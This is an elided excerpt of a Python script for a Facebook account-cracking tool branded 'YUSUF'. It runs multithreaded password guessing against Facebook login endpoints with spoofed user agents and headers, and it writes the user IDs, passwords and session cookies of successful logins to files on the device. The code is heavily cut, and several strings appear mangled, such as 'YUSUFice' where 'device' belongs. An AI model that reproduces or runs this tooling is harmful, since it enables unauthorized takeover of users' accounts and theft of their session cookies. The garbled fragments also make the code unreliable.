...
try:
    ...
    os.system('pip install mechanize requests futures==2 > /YUSUF/null')
    os.system('python YUSUF.py')
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
...
YUSUFua =["Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Safari/537.36",
...
def menu():
    ...
    print(" [6] EXIT TOOL ")
    linex()
    YUSUFv = input("âCHOOSE> ")
    if YUSUFv =='1':f_clone()
    elif YUSUFv =='2':r_clone()
    elif YUSUFv =='3':n_clone()
    elif YUSUFv =='4':g_clone()
    elif YUSUFv =='5':os.system("xdg-open https://t.me/yusuftricker");menu()
    elif YUSUFv =='6':exit()
    else:
...
def f_clone():
   ...
   #print(" [1] CRACK WITH AUTO PASS ")
    ...
    if p == "1":
        ...
        linex()
        for YUSUF in range(plimit):
            ap = input(f" [{YUSUF+1}] ENTER PASSWORD : ")
            plist.append(ap)
    with ThreadPool(max_workers=30) as YUSUF_xd:
        ...
        for love in idz:
            uid, name = love.split("|")
            pwx = plist
            if m == "1":YUSUF_xd.submit(freefb, uid, name, pwx, tl)
            elif m == "2":YUSUF_xd.submit(bapi, uid, name, pwx, tl)
            elif m == "3":YUSUF_xd.submit(graph, uid, name, pwx, tl)
            else:
                YUSUF_xd.submit(graph, uid, name, pwx, tl)
    linex()
...
def r_clone():
    ...
    YUSUFv = input("âCHOOSE> ")
    if YUSUFv =='1':YUSUF1()
    elif YUSUFv =='2':YUSUF2()
    elif YUSUFv =='3':YUSUF3()
    elif YUSUFv =='4':YUSUF4()
    elif YUSUFv =='5':YUSUF5()
    elif YUSUFv =='6':YUSUF6()
    else:
        print("SELECT CORRECT OPTION")
        time.sleep(1)
        menu()
...
def g_clone():
    ...
    os.system('clear')
    print(logo)
    print(" Ex First : ayesha, kazim, YUSUF ")
...
def freefb(uid, name, pwx, tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [YUSUF-M1] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
        ...
        for ps in pwx:
            ...
            'method': 'POST',
            'path': '/login/YUSUFice-based/login/async/',
            'scheme': 'https',
            'content-length': '294',
            ...
            lo = session.post("https://mbasic.facebook.com/login/YUSUFice-based/password/?uid=100095733750131&flow=login_no_pin&refsrc=deprecated&_rdr", data=data, headers=headers).text
            log_cookies = session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                coki = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                print(f" {green}[YUSUF-OK] {uid}|{pw}")
                print(f" {white}[COOKIES] {green}{coki}")
                open("/sdcard/YUSUF_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                oks.append(uid+"|"+pw)
                break
            elif "checkpoint" in log_cookies:
                if "Enter login code to continue" in log_cookies:
                    print(f" {cyan}[YUSUF-2F] {uid}|{pw}")
                    open("/sdcard/YUSUF_file_2F.txt", "a").write(f"{uid}|{pw}\n")
                    twf.append(uid+"|"+pw)
                    break
                else:
                   #print(f" {red}[YUSUF-CP] {uid}|{pw}")
                    open("/sdcard/YUSUF_file_cp.txt", "a").write(f"{uid}|{pw}\n")
                    cps.append(uid+"|"+pw)
                    break
            else:
                continue
...
def bapi(uid, name, pwx, tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [YUSUF-M2] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
        ...
        for ps in pwx:
            ...
            data = {
                ...
                'cpl': 'true',
                'try_num': '1',
                'family_YUSUFice_id': str(uuid.uuid4()),
            ...
            if "session_key" in result:
                ...
                print(f" {red}[YUSUF-CP] {uid}|{pw}")
                open("/sdcard/YUSUF_file_tf.txt", "a").write(f"{uid}|{pw}\n")
                cps.append(uid+"|"+pw)
                break
            else:
                continue
...
def graph(uid, name, pwx, tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [YUSUF-M3] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
        ...
        for ps in pwx:
            ...
            headers = {
                ...
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-YUSUFice-group': str(random.randint(2000, 4000)),
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
...
def mbasic(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M1-YUSUF] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
...
def p(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M2-YUSUF] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
...
def x(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            lo = session.post('https://x.facebook.com/login/YUSUFice-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
...
def freeq(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M5-YUSUF] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
